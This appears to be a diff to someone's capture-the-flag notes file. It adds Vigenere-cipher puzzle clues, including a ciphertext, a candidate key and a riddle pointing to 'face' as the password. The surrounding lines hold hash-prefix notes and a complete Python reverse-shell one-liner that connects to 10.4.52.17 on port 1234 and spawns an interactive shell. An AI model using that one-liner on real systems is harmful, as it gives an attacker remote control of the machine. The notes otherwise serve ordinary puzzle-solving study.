@@ -2,6 +2,23 @@ $6$ = sha512
 $y$, $2a$ = bcrypt
 
 %0A = /n (base64 encoding)
+__________________________________________________________________________________________________________________________
+(Vigenere Cipher)
+
+Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
+Sfw. Kajnmb xsi owuowge
+Faz. Tml fkfr qgseik ag oqeibx
+__________________________________________________________________________________________________________________________
+
+haiinspsyanileph (Vigenere Cipher)
+
+The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
+was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
+hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
+ahahahhahaha. Ahhh Face it... he's just odd.
+
+Too many Face words are in here so, that word becomes the key/password to decrypt
+__________________________________________________________________________________________________________________________
 
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.52.17",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 
